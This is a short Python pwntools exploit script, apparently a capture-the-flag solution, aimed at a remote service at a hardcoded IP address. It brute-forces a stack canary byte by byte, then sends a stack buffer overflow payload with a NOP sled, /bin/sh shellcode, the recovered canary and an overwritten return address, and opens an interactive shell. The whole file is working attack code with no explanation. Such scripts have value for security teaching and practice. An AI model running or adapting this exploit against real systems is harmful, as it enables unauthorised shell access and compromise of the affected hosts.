from pwn import *
from time import sleep
debug = True
debug = False
#context.log_level = 'error'
HOST, PORT = '', 7070
if debug:
    HOST, PORT = 'localhost', 6969
else:
    HOST, PORT = '128.39.143.166', 1341
def get_p():
    return remote(HOST, PORT)


def bruteforce_cookie():
    cookie = []
    while len(cookie) != 4:
        for i in range(255):
            p = get_p()

            a = p.recv(4)
            payload = "A"*1024
            for elem in cookie:
                payload += p8(elem)
            payload += p8(i)
            p.send(payload)

            try:
                p.recvline()
            except:
                cookie.append(i)
                break

            p.close()

    return cookie

cookie = bruteforce_cookie()
print cookie
c = '0x'
for i in cookie[::-1]:
    c += hex(i).split("x")[1]

print c
c += '0'
cookie = int(c, 16)

pop_ret  = 0x08048B5B
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

p = get_p()
buff = p.recv(4)

payload  = ''
payload += '\x90' * 500
payload += shellcode
payload += 'A' * (1024 - len(payload))
payload += p32(cookie) * 4
payload += p32(u32(buff) - 1080)
payload += p32(pop_ret)


p.send(payload)
p.interactive()
